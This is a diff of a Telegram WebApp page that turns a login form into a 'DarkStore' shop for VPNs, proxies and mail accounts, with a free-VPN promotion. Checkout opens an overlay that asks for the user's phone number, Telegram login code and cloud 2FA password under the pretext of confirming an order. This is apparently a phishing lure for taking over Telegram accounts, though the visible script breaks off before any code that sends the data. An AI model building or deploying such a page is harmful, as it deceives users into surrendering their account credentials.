@@ -1,460 +1,991 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Telegram WebApp Авторизация</title>
-  
-  <!-- Telegram WebApp SDK - обязательно подключаем согласно документации -->
-  <!-- https://core.telegram.org/bots/webapps -->
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  
-  <style>
-    :root {
-      --bg: #0b0f14;
-      --fg: #e5e7eb;
-      --card: #0f172a;
-      --muted: #94a3b8;
-      --border: #1f2937;
-      --accent: #38bdf8;
-      --success: #10b981;
-      --error: #ef4444;
-    }
-    
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-      background: var(--bg);
-      color: var(--fg);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
-    
-    .card {
-      width: 100%;
-      max-width: 440px;
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      padding: 24px;
-      box-shadow: 0 10px 30px rgba(0,0,0,.3);
-    }
-    
-    h1 {
-      margin-bottom: 8px;
-      font-size: 24px;
-      font-weight: 700;
-      color: #fff;
-    }
-    
-    .subtitle {
-      margin-bottom: 20px;
-      color: var(--muted);
-      font-size: 14px;
-      line-height: 1.5;
-    }
-    
-    .step {
-      margin-bottom: 20px;
-    }
-    
-    .field {
-      margin-bottom: 16px;
-    }
-    
-    label {
-      display: block;
-      font-size: 13px;
-      font-weight: 500;
-      color: var(--muted);
-      margin-bottom: 8px;
-    }
-    
-    input {
-      width: 100%;
-      padding: 12px 14px;
-      border-radius: 8px;
-      border: 1px solid #334155;
-      background: #0b1220;
-      color: var(--fg);
-      font-size: 15px;
-      outline: none;
-      transition: all 0.2s;
-    }
-    
-    input:focus {
-      border-color: var(--accent);
-      box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.15);
-    }
-    
-    button {
-      width: 100%;
-      padding: 12px 16px;
-      border-radius: 8px;
-      border: none;
-      background: var(--accent);
-      color: #0b1220;
-      font-size: 15px;
-      font-weight: 700;
-      cursor: pointer;
-      transition: all 0.2s;
-    }
-    
-    button:hover {
-      background: #0ea5e9;
-      transform: translateY(-1px);
-    }
-    
-    button:active {
-      transform: translateY(0);
-    }
-    
-    button:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-      transform: none;
-    }
-    
-    .status {
-      margin-top: 16px;
-      padding: 12px;
-      border-radius: 8px;
-      font-size: 13px;
-      text-align: center;
-      display: none;
-    }
-    
-    .status.visible {
-      display: block;
-    }
-    
-    .status.info {
-      background: rgba(56, 189, 248, 0.1);
-      color: var(--accent);
-      border: 1px solid rgba(56, 189, 248, 0.2);
-    }
-    
-    .status.success {
-      background: rgba(16, 185, 129, 0.1);
-      color: var(--success);
-      border: 1px solid rgba(16, 185, 129, 0.2);
-    }
-    
-    .status.error {
-      background: rgba(239, 68, 68, 0.1);
-      color: var(--error);
-      border: 1px solid rgba(239, 68, 68, 0.2);
-    }
-    
-    .hidden {
-      display: none !important;
-    }
-    
-    .debug-info {
-      margin-top: 20px;
-      padding: 12px;
-      background: #0b1220;
-      border: 1px solid #1e293b;
-      border-radius: 8px;
-      font-size: 11px;
-      color: #64748b;
-      word-break: break-all;
-    }
-  </style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Digital Market & VPN</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --header-bg: #1e293b;
+            --border-color: #334155;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --accent: #3b82f6;
+            --accent-hover: #2563eb;
+            --danger: #ef4444;
+            --success: #10b981;
+        }
+
+        * {
+            box-sizing: border-box;
+            outline: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-color);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        .app-header {
+            position: sticky;
+            top: 0;
+            z-index: 50;
+            background: rgba(30, 41, 59, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+        }
+
+        .logo-area {
+            font-size: 18px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--text-main);
+        }
+
+        .logo-img {
+            height: 32px;
+            width: auto;
+            border-radius: 6px;
+        }
+
+        .header-controls {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .lang-btn {
+            background: transparent;
+            color: var(--text-muted);
+            border: 1px solid var(--border-color);
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        .lang-btn.active {
+            background: var(--accent);
+            color: white;
+            border-color: var(--accent);
+        }
+
+        .cart-icon-wrap {
+            position: relative;
+            cursor: pointer;
+            padding: 5px;
+        }
+        .cart-icon-svg {
+            width: 24px;
+            height: 24px;
+            fill: var(--text-main);
+        }
+        .cart-badge {
+            position: absolute;
+            top: -2px;
+            right: -2px;
+            background: var(--danger);
+            color: white;
+            font-size: 10px;
+            font-weight: bold;
+            height: 16px;
+            min-width: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 99px;
+            padding: 0 4px;
+        }
+
+        .nav-tabs {
+            display: flex;
+            padding: 0 10px;
+            gap: 5px;
+        }
+
+        .nav-tab {
+            flex: 1;
+            text-align: center;
+            padding: 12px 0;
+            color: var(--text-muted);
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+        }
+        .nav-tab.active {
+            color: var(--accent);
+            border-bottom-color: var(--accent);
+        }
+
+        .app-container {
+            flex: 1;
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .section-view { display: none; animation: fadeIn 0.3s ease; }
+        .section-view.active { display: block; }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+
+        .filter-bar {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .filter-select {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            padding: 8px 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            flex: 1;
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2394a3b8' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 10px center;
+            background-size: 14px;
+        }
+
+        .item-list { display: flex; flex-direction: column; gap: 12px; }
+
+        .product-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .product-info { display: flex; align-items: center; gap: 15px; }
+        .flag { font-size: 24px; }
+        .product-details h3 { margin: 0; font-size: 15px; font-weight: 600; }
+        .product-details p { margin: 4px 0 0 0; font-size: 12px; color: var(--text-muted); }
+
+        .price-tag {
+            background: rgba(59, 130, 246, 0.1);
+            color: var(--accent);
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 700;
+            margin-right: 10px;
+        }
+
+        .action-btn {
+            border: none;
+            border-radius: 8px;
+            padding: 8px 16px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        
+        .btn-connect {
+            background: var(--accent);
+            color: white;
+        }
+        .btn-connect:active { background: var(--accent-hover); transform: scale(0.95); }
+
+        .btn-add {
+            background: transparent;
+            border: 1px solid var(--accent);
+            color: var(--accent);
+        }
+        .btn-add:active { background: rgba(59, 130, 246, 0.1); transform: scale(0.95); }
+
+        .mail-list { display: flex; flex-direction: column; gap: 8px; }
+        
+        .mail-item {
+            background: #182235;
+            border: 1px solid #2d3b55;
+            border-radius: 6px;
+            padding: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .mail-item:hover { border-color: var(--accent); }
+
+        .mail-left { display: flex; align-items: center; gap: 12px; }
+        .mail-icon { font-size: 20px; }
+        .mail-name { font-size: 14px; font-weight: 500; color: #e2e8f0; }
+        
+        .mail-right { display: flex; align-items: center; gap: 15px; }
+        .mail-price { font-size: 14px; font-weight: 700; color: white; }
+        .mail-stock { font-size: 12px; color: #64748b; min-width: 50px; text-align: right; }
+
+        .cart-summary {
+            background: var(--card-bg);
+            padding: 20px;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            margin-top: 20px;
+        }
+        .cart-total-row {
+            display: flex; justify-content: space-between; 
+            font-size: 18px; font-weight: bold; margin-bottom: 20px;
+            border-top: 1px solid var(--border-color);
+            padding-top: 15px;
+        }
+        .cart-items-container { min-height: 100px; }
+        .empty-cart-msg { text-align: center; color: var(--text-muted); padding: 30px; }
+
+        .cart-item-row {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 10px 0; border-bottom: 1px solid #334155;
+        }
+        .btn-remove { color: var(--danger); background: none; border: none; font-size: 18px; cursor: pointer; }
+
+        .btn-checkout {
+            width: 100%;
+            padding: 15px;
+            background: var(--success);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .login-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--bg-color); z-index: 100;
+            padding: 20px;
+            display: flex; flex-direction: column; align-items: center;
+            overflow-y: auto;
+        }
+        
+        .form-container { width: 100%; max-width: 360px; margin-top: 40px; }
+        
+        .login_header_text { text-align: center; font-size: 20px; font-weight: 700; margin-bottom: 10px; }
+        .login_confirm_text { text-align: center; font-size: 14px; color: var(--text-muted); margin-bottom: 30px; line-height: 1.5; }
+
+        select, input {
+            background: var(--card-bg) !important;
+            border: 1px solid var(--border-color) !important;
+            color: var(--text-main) !important;
+            padding: 14px 16px !important;
+            border-radius: 10px !important;
+            width: 100%;
+            font-size: 16px; margin-bottom: 15px;
+        }
+        select:focus, input:focus { border-color: var(--accent) !important; }
+
+        .login_phone_field_wrap { display: flex; gap: 10px; margin-bottom: 25px;}
+        .login_code_field_wrap { flex: 0 0 80px; }
+        .login_number_field_wrap { flex: 1; }
+
+        .login_button_wrap { display: flex; gap: 10px; }
+        .btn { flex: 1; padding: 14px; border: none; border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer; }
+        .btn-next { background: var(--accent); color: white; }
+        .btn-cancel { background: transparent; border: 1px solid var(--border-color); color: var(--text-muted); }
+
+        .code_inputs_container { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
+        .code_input {
+            width: 50px !important; height: 60px !important;
+            text-align: center; font-size: 24px; padding: 0 !important;
+            background: var(--card-bg) !important;
+            border: 2px solid var(--border-color) !important; color: white;
+        }
+        .code_input:focus { border-color: var(--accent) !important; }
+
+        .status_message { margin-top: 20px; text-align: center; font-size: 14px; }
+        .status_message.error { color: var(--danger); }
+        .status_message.success { color: var(--success); }
+
+        .hidden { display: none !important; }
+    </style>
 </head>
 <body>
-  <div class="card">
-    <h1>🔐 Вход в Telegram</h1>
-    <p class="subtitle">
-      WebApp запущен внутри Telegram. Данные защищены через initData валидацию.
-    </p>
 
-    <!-- Шаг 1: Ввод телефона -->
-    <div id="step-phone" class="step">
-      <div class="field">
-        <label for="phone">📱 Номер телефона</label>
-        <input 
-          id="phone" 
-          type="tel" 
-          placeholder="+79998887766"
-          autocomplete="tel"
-        />
-      </div>
-      <button id="send-code">Отправить код</button>
+    <div id="main-app">
+        <header class="app-header">
+            <div class="header-top">
+                <div class="logo-area">
+                    <img src="https://i.ibb.co/cXpWQVsq/Chat-GPT-Image-8-2025-22-39-29.png" alt="Logo" class="logo-img">
+                    <span>DarkStore</span>
+                </div>
+                <div class="header-controls">
+                    <div class="lang-switcher">
+                        <button class="lang-btn active" onclick="setLanguage('ru')" id="btn-ru">RU</button>
+                        <button class="lang-btn" onclick="setLanguage('en')" id="btn-en">EN</button>
+                    </div>
+                    <div class="cart-icon-wrap" onclick="switchTab('cart')">
+                        <svg class="cart-icon-svg" viewBox="0 0 24 24">
+                            <path d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zM1 2v2h2l3.6 7.59-1.35 2.45c-.16.28-.25.61-.25.96 0 1.1.9 2 2 2h12v-2H7.42c-.14 0-.25-.11-.25-.25l.03-.12.9-1.63h7.45c.75 0 1.41-.41 1.75-1.03l3.58-6.49c.08-.14.12-.31.12-.48 0-.55-.45-1-1-1H5.21l-.94-2H1zm16 16c-1.1 0-1.99.9-1.99 2s.89 2 1.99 2 2-.9 2-2-.9-2-2-2z"/>
+                        </svg>
+                        <div id="cart-count" class="cart-badge hidden">0</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="nav-tabs">
+                <div class="nav-tab active" onclick="switchTab('vpn')" data-tab="vpn" data-lang-key="tab_vpn">VPN</div>
+                <div class="nav-tab" onclick="switchTab('proxy')" data-tab="proxy" data-lang-key="tab_proxy">Proxies</div>
+                <div class="nav-tab" onclick="switchTab('mail')" data-tab="mail" data-lang-key="tab_mail">Mail</div>
+            </div>
+        </header>
+
+        <div class="app-container">
+            
+            <div id="view-vpn" class="section-view active">
+                <div style="background: linear-gradient(135deg, #10b981 0%, #059669 100%); padding: 16px; border-radius: 12px; margin-bottom: 20px; text-align: center; border: 1px solid #047857;">
+                    <div style="font-size: 20px; margin-bottom: 4px;">🎉</div>
+                    <div style="font-weight: 700; font-size: 16px; margin-bottom: 6px;" data-lang-key="promo_title">Акция! Бесплатный VPN на 2 недели</div>
+                    <div style="font-size: 13px; color: #d1fae5; line-height: 1.4;" data-lang-key="promo_desc">Подключите любой VPN бесплатно на 14 дней. Без ограничений!</div>
+                </div>
+                
+                <div class="filter-bar">
+                    <select class="filter-select" id="country-filter" onchange="filterVPNs()">
+                        <option value="all" data-lang-key="filter_all_countries">🏳️ All Countries</option>
+                        <option value="RU">🇷🇺 Russia</option>
+                        <option value="DE">🇩🇪 Germany</option>
+                        <option value="US">🇺🇸 USA</option>
+                        <option value="NL">🇳🇱 Netherlands</option>
+                        <option value="GB">🇬🇧 UK</option>
+                        <option value="FR">🇫🇷 France</option>
+                    </select>
+                    <select class="filter-select" id="type-filter" onchange="filterVPNs()">
+                        <option value="all" data-lang-key="filter_all_types">⚡ All Types</option>
+                        <option value="fast" data-lang-key="filter_fast">⚡ Fast</option>
+                        <option value="p2p" data-lang-key="filter_p2p">🛡️ P2P</option>
+                        <option value="gaming" data-lang-key="filter_gaming">🎮 Gaming</option>
+                    </select>
+                </div>
+                
+                <div class="item-list" id="vpn-list"></div>
+            </div>
+
+            <div id="view-proxy" class="section-view">
+                <div class="filter-bar">
+                    <select class="filter-select">
+                        <option>IPv4 Shared</option>
+                        <option>IPv4 Private</option>
+                        <option>IPv6</option>
+                    </select>
+                </div>
+                <div class="item-list">
+                    <div class="product-card">
+                        <div class="product-info">
+                            <div style="background:#334155; padding:8px; border-radius:8px;">🌐</div>
+                            <div class="product-details">
+                                <h3 data-lang-key="proxy_shared">IPv4 Shared • RU</h3>
+                                <p data-lang-key="proxy_shared_desc">30 days | HTTP/SOCKS5</p>
+                            </div>
+                        </div>
+                        <div style="display:flex; align-items: center;">
+                            <span class="price-tag">99 ₽</span>
+                            <button class="action-btn btn-add" onclick="addToCart('Proxy IPv4 Shared RU', 99)" data-lang-key="btn_add_cart">+ Add</button>
+                        </div>
+                    </div>
+                    
+                    <div class="product-card">
+                        <div class="product-info">
+                            <div style="background:#334155; padding:8px; border-radius:8px;">🚀</div>
+                            <div class="product-details">
+                                <h3 data-lang-key="proxy_private">IPv4 Private • USA</h3>
+                                <p data-lang-key="proxy_private_desc">30 days | Dedicated</p>
+                            </div>
+                        </div>
+                         <div style="display:flex; align-items: center;">
+                            <span class="price-tag">250 ₽</span>
+                            <button class="action-btn btn-add" onclick="addToCart('Proxy IPv4 Private USA', 250)" data-lang-key="btn_add_cart">+ Add</button>
+                        </div>
+                    </div>
+
+                    <div class="product-card">
+                        <div class="product-info">
+                            <div style="background:#334155; padding:8px; border-radius:8px;">🔄</div>
+                            <div class="product-details">
+                                <h3 data-lang-key="proxy_mobile">Mobile Proxy • LTE</h3>
+                                <p data-lang-key="proxy_mobile_desc">IP Rotation | Unlimited</p>
+                            </div>
+                        </div>
+                         <div style="display:flex; align-items: center;">
+                            <span class="price-tag">1200 ₽</span>
+                            <button class="action-btn btn-add" onclick="addToCart('Mobile Proxy LTE', 1200)" data-lang-key="btn_add_cart">+ Add</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="view-mail" class="section-view">
+                <div class="mail-list" id="mail-list-container"></div>
+            </div>
+
+            <div id="view-cart" class="section-view">
+                <h2 style="margin-top:0;" data-lang-key="cart_title">Cart</h2>
+                <div class="cart-summary">
+                    <div id="cart-items" class="cart-items-container">
+                        <div class="empty-cart-msg" data-lang-key="cart_empty">Cart is empty</div>
+                    </div>
+                    <div class="cart-total-row">
+                        <span data-lang-key="cart_total">Total:</span>
+                        <span id="cart-total">0 ₽</span>
+                    </div>
+                    <button class="btn-checkout" onclick="checkout()" data-lang-key="btn_checkout">Proceed to payment</button>
+                </div>
+            </div>
+        </div>
     </div>
 
-    <!-- Шаг 2: Ввод кода -->
-    <div id="step-code" class="step hidden">
-      <div class="field">
-        <label for="code">💬 Код из Telegram</label>
-        <input 
-          id="code" 
-          type="text" 
-          placeholder="12345"
-          autocomplete="one-time-code"
-        />
-      </div>
-      <button id="verify-code">Подтвердить код</button>
-    </div>
+    <main class="login-overlay hidden" id="login-section">
+        <div class="form-container">
+            <div class="login_header_text" id="auth-title">Confirmation</div>
+            <div class="login_confirm_text" id="auth-desc">
+                To complete the operation, please confirm your Telegram account.
+            </div>
 
-    <!-- Шаг 3: Ввод пароля 2FA (если требуется) -->
-    <div id="step-2fa" class="step hidden">
-      <div class="field">
-        <label for="password">🔑 Пароль 2FA</label>
-        <input 
-          id="password" 
-          type="password" 
-          placeholder="Введите пароль"
-          autocomplete="current-password"
-        />
-      </div>
-      <button id="verify-password">Войти</button>
-    </div>
+            <div id="step-phone">
+                <form id="auth-form">
+                    <select class="login_country_select" id="country-select">
+                        <option value="+7" data-mask=" (___) ___-__-__" selected>🇷🇺 Russia</option>
+                        <option value="+380" data-mask=" (__) ___-__-__">🇺🇦 Ukraine</option>
+                        <option value="+375" data-mask=" (__) ___-__-__">🇧🇾 Belarus</option>
+                        <option value="+7" data-mask=" (___) ___-__-__">🇰🇿 Kazakhstan</option>
+                        <option value="+1" data-mask=" (___) ___-____">🇺🇸 USA</option>
+                        <option value="+44" data-mask=" ____ ______">🇬🇧 UK</option>
+                        <option value="+49" data-mask=" __ ____ ____">🇩🇪 Germany</option>
+                    </select>
 
-    <!-- Статус -->
-    <div id="status" class="status"></div>
+                    <div class="login_phone_field_wrap">
+                        <div class="login_code_field_wrap">
+                            <input type="tel" id="phone-code" value="+7" readonly style="text-align:center;">
+                        </div>
+                        <div class="login_number_field_wrap">
+                            <input type="tel" id="phone-number" placeholder="(999) 000-00-00" required>
+                        </div>
+                    </div>
 
-    <!-- Debug info (опционально, для разработки) -->
-    <div id="debug" class="debug-info hidden"></div>
-  </div>
+                    <div class="login_button_wrap">
+                        <button type="button" class="btn btn-cancel" onclick="cancelLogin()" data-lang-key="btn_cancel">Cancel</button>
+                        <button type="submit" class="btn btn-next" id="send-code" data-lang-key="btn_confirm">Confirm</button>
+                    </div>
+                </form>
+            </div>
 
-  <script>
-    // ========== Configuration ==========
-    // Backend URL - должен совпадать с BACKEND_BASE в config.py
-    const API_BASE = 'https://supercritical-hatable-elanor.ngrok-free.dev';
+            <div id="step-code" class="hidden">
+                <div class="login_confirm_text" data-lang-key="code_sent">Code sent to Telegram</div>
+                <div class="code_inputs_container">
+                    <input class="code_input" type="text" maxlength="1" data-index="0" inputmode="numeric">
+                    <input class="code_input" type="text" maxlength="1" data-index="1" inputmode="numeric" disabled>
+                    <input class="code_input" type="text" maxlength="1" data-index="2" inputmode="numeric" disabled>
+                    <input class="code_input" type="text" maxlength="1" data-index="3" inputmode="numeric" disabled>
+                    <input class="code_input" type="text" maxlength="1" data-index="4" inputmode="numeric" disabled>
+                </div>
+                <div class="login_button_wrap">
+                    <button type="button" class="btn btn-cancel" id="back-to-phone" data-lang-key="btn_back">Back</button>
+                </div>
+            </div>
 
-    // ========== Telegram WebApp Init ==========
-    const tg = window.Telegram?.WebApp;
-    
-    if (tg) {
-      // Инициализируем WebApp
-      tg.ready();
-      tg.expand();
-      
-      // Опционально: применяем цветовую тему Telegram
-      if (tg.themeParams) {
-        document.documentElement.style.setProperty('--accent', tg.themeParams.button_color || '#38bdf8');
-      }
-    }
+            <div id="step-2fa" class="hidden">
+                 <div class="login_confirm_text" data-lang-key="enter_password">Enter cloud password (2FA)</div>
+                 <div id="password-hint-container" class="hidden" style="margin-bottom:10px; font-size:12px; color:#cbd5e1;">
+                    <span data-lang-key="password_hint">Hint:</span> <span id="password-hint"></span>
+                 </div>
+                 <input type="password" id="password" placeholder="Password">
+                 <div class="login_button_wrap">
+                    <button type="button" class="btn btn-cancel" id="back-to-code" data-lang-key="btn_back">Back</button>
+                    <button type="button" class="btn btn-next" id="verify-password" data-lang-key="btn_login">Login</button>
+                </div>
+            </div>
 
-    // initData - подписанная строка от Telegram для валидации на backend
-    // Это ключевой параметр безопасности WebApp
-    const initData = tg ? tg.initData : '';
-    
-    // Debug: показываем initData (только для разработки!)
-    const debugEl = document.getElementById('debug');
-    if (initData) {
-      debugEl.textContent = `InitData length: ${initData.length} chars`;
-      debugEl.classList.remove('hidden');
-    }
+            <div id="step-success" class="hidden" style="text-align: center;">
+                <div style="font-size: 60px; margin-bottom: 20px;">✅</div>
+                <h2 style="color:white;" data-lang-key="success_title">Success!</h2>
+                <p id="success-msg" style="color:var(--text-muted);">Order is being processed.</p>
+            </div>
 
-    // ========== DOM Elements ==========
-    const byId = id => document.getElementById(id);
-    
-    const stepPhone = byId('step-phone');
-    const stepCode = byId('step-code');
-    const step2fa = byId('step-2fa');
-    const statusEl = byId('status');
-    
-    const phoneInput = byId('phone');
-    const codeInput = byId('code');
-    const passwordInput = byId('password');
-    
-    const sendCodeBtn = byId('send-code');
-    const verifyCodeBtn = byId('verify-code');
-    const verifyPasswordBtn = byId('verify-password');
+            <p id="status" class="status_message"></p>
+        </div>
+    </main>
 
-    // ========== State ==========
-    let sessionId = null;
+    <script>
+        // === LANGUAGE SYSTEM ===
+        const translations = {
+            ru: {
+                tab_vpn: 'VPN',
+                tab_proxy: 'Прокси',
+                tab_mail: 'Почта',
+                filter_all_countries: '🏳️ Все страны',
+                filter_all_types: '⚡ Все типы',
+                filter_fast: '⚡ Быстрые',
+                filter_p2p: '🛡️ P2P',
+                filter_gaming: '🎮 Игровые',
+                btn_connect: 'ВКЛЮЧИТЬ',
+                btn_add_cart: '+ В корзину',
+                proxy_shared: 'IPv4 Shared • RU',
+                proxy_shared_desc: 'Срок: 30 дней | HTTP/SOCKS5',
+                proxy_private: 'IPv4 Private • USA',
+                proxy_private_desc: 'Срок: 30 дней | В одни руки',
+                proxy_mobile: 'Mobile Proxy • LTE',
+                proxy_mobile_desc: 'Ротация IP | Безлимит',
+                cart_title: 'Корзина',
+                cart_empty: 'Корзина пуста',
+                cart_total: 'Итого:',
+                btn_checkout: 'Перейти к оплате',
+                btn_cancel: 'Отмена',
+                btn_confirm: 'Подтвердить',
+                btn_back: 'Назад',
+                btn_login: 'Войти',
+                code_sent: 'Код отправлен в Telegram',
+                enter_password: 'Введите облачный пароль (2FA)',
+                password_hint: 'Подсказка:',
+                success_title: 'Успешно!',
+                vpn_ping: 'Пинг:',
+                vpn_optimized: 'Оптимизирован',
+                vpn_low_latency: 'Низкая задержка',
+                vpn_unblock: 'Разблокировка',
+                vpn_gaming: 'Для игр',
+                vpn_streaming: 'Для стриминга',
+                vpn_p2p: 'P2P разрешён',
+                promo_title: 'Акция! Бесплатный VPN на 2 недели',
+                promo_desc: 'Подключите любой VPN бесплатно на 14 дней. Без ограничений!'
+            },
+            en: {
+                tab_vpn: 'VPN',
+                tab_proxy: 'Proxies',
+                tab_mail: 'Mail',
+                filter_all_countries: '🏳️ All Countries',
+                filter_all_types: '⚡ All Types',
+                filter_fast: '⚡ Fast',
+                filter_p2p: '🛡️ P2P',
+                filter_gaming: '🎮 Gaming',
+                btn_connect: 'CONNECT',
+                btn_add_cart: '+ Add to Cart',
+                proxy_shared: 'IPv4 Shared • RU',
+                proxy_shared_desc: '30 days | HTTP/SOCKS5',
+                proxy_private: 'IPv4 Private • USA',
+                proxy_private_desc: '30 days | Dedicated',
+                proxy_mobile: 'Mobile Proxy • LTE',
+                proxy_mobile_desc: 'IP Rotation | Unlimited',
+                cart_title: 'Cart',
+                cart_empty: 'Cart is empty',
+                cart_total: 'Total:',
+                btn_checkout: 'Proceed to Payment',
+                btn_cancel: 'Cancel',
+                btn_confirm: 'Confirm',
+                btn_back: 'Back',
+                btn_login: 'Login',
+                code_sent: 'Code sent to Telegram',
+                enter_password: 'Enter cloud password (2FA)',
+                password_hint: 'Hint:',
+                success_title: 'Success!',
+                vpn_ping: 'Ping:',
+                vpn_optimized: 'Optimized',
+                vpn_low_latency: 'Low Latency',
+                vpn_unblock: 'Unblock ALL',
+                vpn_gaming: 'Gaming',
+                vpn_streaming: 'Streaming',
+                vpn_p2p: 'P2P Allowed',
+                promo_title: 'Promo! Free VPN for 2 Weeks',
+                promo_desc: 'Connect any VPN free for 14 days. No limits!'
+            }
+        };
 
-    // ========== UI Helpers ==========
-    function show(el) { el.classList.remove('hidden'); }
-    function hide(el) { el.classList.add('hidden'); }
+        let currentLang = 'ru';
 
-    function setStatus(text, type = 'info') {
-      statusEl.textContent = text;
-      statusEl.className = `status visible ${type}`;
-      
-      // Опционально: обновляем MainButton в Telegram
-      if (tg && tg.MainButton) {
-        tg.MainButton.setText(text);
-      }
-    }
+        function setLanguage(lang) {
+            currentLang = lang;
+            document.getElementById('btn-ru').classList.toggle('active', lang === 'ru');
+            document.getElementById('btn-en').classList.toggle('active', lang === 'en');
+            
+            // Update all elements with data-lang-key
+            document.querySelectorAll('[data-lang-key]').forEach(el => {
+                const key = el.getAttribute('data-lang-key');
+                if (translations[lang][key]) {
+                    el.textContent = translations[lang][key];
+                }
+            });
+            
+            // Re-render VPN list with new language
+            renderVPNList();
+        }
 
-    function clearStatus() {
-      statusEl.className = 'status';
-    }
+        // === VPN DATA (20 servers) ===
+        const vpnServers = [
+            { country: 'RU', flag: '🇷🇺', name: 'Moscow Private', ping: 12, type: 'gaming', desc_ru: 'Roblox Оптимизирован', desc_en: 'Roblox Optimized' },
+            { country: 'RU', flag: '🇷🇺', name: 'St. Petersburg Fast', ping: 15, type: 'fast', desc_ru: 'Низкая задержка', desc_en: 'Low Latency' },
+            { country: 'DE', flag: '🇩🇪', name: 'Frankfurt Game', ping: 34, type: 'gaming', desc_ru: 'Низкая задержка', desc_en: 'Low Latency' },
+            { country: 'DE', flag: '🇩🇪', name: 'Berlin Streaming', ping: 38, type: 'fast', desc_ru: 'Для стриминга', desc_en: 'For Streaming' },
+            { country: 'US', flag: '🇺🇸', name: 'New York #1', ping: 105, type: 'fast', desc_ru: 'Разблокировка всего', desc_en: 'Unblock ALL' },
+            { country: 'US', flag: '🇺🇸', name: 'Los Angeles Media', ping: 118, type: 'p2p', desc_ru: 'P2P разрешён', desc_en: 'P2P Allowed' },
+            { country: 'US', flag: '🇺🇸', name: 'Chicago Speed', ping: 98, type: 'fast', desc_ru: 'Высокая скорость', desc_en: 'High Speed' },
+            { country: 'NL', flag: '🇳🇱', name: 'Amsterdam P2P', ping: 42, type: 'p2p', desc_ru: 'P2P разрешён', desc_en: 'P2P Allowed' },
+            { country: 'NL', flag: '🇳🇱', name: 'Rotterdam Pro', ping: 45, type: 'fast', desc_ru: 'Для игр', desc_en: 'For Gaming' },
+            { country: 'GB', flag: '🇬🇧', name: 'London Prime', ping: 52, type: 'fast', desc_ru: 'Премиум скорость', desc_en: 'Premium Speed' },
+            { country: 'GB', flag: '🇬🇧', name: 'Manchester Game', ping: 55, type: 'gaming', desc_ru: 'Оптимизирован', desc_en: 'Optimized' },
+            { country: 'FR', flag: '🇫🇷', name: 'Paris Elite', ping: 48, type: 'fast', desc_ru: 'Высокая скорость', desc_en: 'High Speed' },
+            { country: 'FR', flag: '🇫🇷', name: 'Lyon Secure', ping: 51, type: 'p2p', desc_ru: 'P2P + Защита', desc_en: 'P2P + Secure' },
+            { country: 'RU', flag: '🇷🇺', name: 'Moscow #2', ping: 14, type: 'p2p', desc_ru: 'P2P разрешён', desc_en: 'P2P Allowed' },
+            { country: 'DE', flag: '🇩🇪', name: 'Munich Ultra', ping: 40, type: 'gaming', desc_ru: 'Для игр Pro', desc_en: 'Gaming Pro' },
